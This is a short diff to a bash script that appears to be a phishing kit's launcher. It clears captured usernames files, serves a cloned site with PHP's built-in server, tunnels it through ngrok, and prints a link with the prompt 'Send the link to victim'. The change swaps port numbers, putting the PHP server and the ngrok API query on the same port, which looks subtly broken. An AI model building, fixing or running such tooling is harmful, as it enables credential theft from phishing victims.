@@ -192,7 +192,7 @@ start_s() {
     if [[ -e sites/$server/usernames.txt ]]; then
     rm -rf sites/$server/usernames.txt
     fi
-    def_port="8080"
+    def_port="5555"
     printf "\e[0m\n"
     printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
     read port
@@ -256,11 +256,11 @@ start_n() {
     fi
     printf "\e[0m\n"
     printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ..\e[0m\n"
-    cd sites/$server && php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+    cd sites/$server && php -S 127.0.0.1:8080 > /dev/null 2>&1 &
     sleep 2
-    ./ngrok http 4444 > /dev/null 2>&1 &
+    ./ngrok http 8080 > /dev/null 2>&1 &
     sleep 10
-    link=$(curl -s -N http://127.0.0.1:4444/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+    link=$(curl -s -N http://127.0.0.1:8080/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
     printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $link
     found
 }
